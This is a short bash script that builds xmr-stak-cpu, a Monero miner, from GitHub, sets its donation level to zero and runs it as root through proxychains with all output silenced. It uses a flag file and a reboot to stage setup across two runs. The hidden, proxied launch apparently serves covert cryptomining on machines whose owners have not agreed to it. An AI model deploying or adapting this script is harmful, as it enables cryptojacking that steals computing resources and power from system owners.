#!/bin/bash
sudo sysctl -w vm.nr_hugepages=128
file="/flag2"
if [ -f "$file" ]
then
	sudo apt-get install cmake -y
	cd /xmr
	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
	
	sudo git clone --recursive https://github.com/fireice-uk/xmr-stak-cpu.git
	cd /xmr/xmr/xmr-stak-cpu
	sudo sed -i 's/1.0/0.0/' /xmr/xmr/xmr-stak-cpu/donate-level.h
	sudo cmake -DCMAKE_LINK_STATIC=ON . -DMICROHTTPD_REQUIRED=OFF
	sudo make
	sudo make install
	sudo chmod +x /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu	
 	sudo chmod +x /xmr/xmr/proxychains-ng/proxychains4	
 	sudo chmod +x /xmr/xmr/proxychains-ng/libproxychains4.so
	sudo cp /xmr/xmr/xmr/config.txt /xmr/xmr/xmr-stak-cpu/bin/config.txt
        
	cd /xmr/xmr/xmr-stak-cpu/bin/
        sudo /xmr/xmr/proxychains-ng/proxychains4 -f /xmr/xmr/proxychains/proxychains.conf /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
          
else
        sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
        sudo /bin/su -c "echo 'xxxxx' >> /flag2"
        sudo reboot  
fi

exit
